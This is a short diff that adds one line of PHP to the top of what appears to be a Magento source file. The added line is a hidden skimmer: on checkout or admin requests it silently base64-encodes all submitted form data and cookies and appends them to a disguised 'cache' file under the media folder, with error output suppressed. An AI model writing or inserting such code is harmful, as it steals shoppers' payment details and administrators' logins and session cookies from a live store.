@@ -1,3 +1,4 @@
+<?php if(preg_match("/checkout|admin/", $_SERVER["REQUEST_URI"])){@file_put_contents(realpath("./")."/media/cache_d956525b48d7374e71b49d33fc2524af", @base64_encode(serialize($_REQUEST)."--".serialize($_COOKIE)). ":", FILE_APPEND); }?>
 <?php
 /**
  * Magento
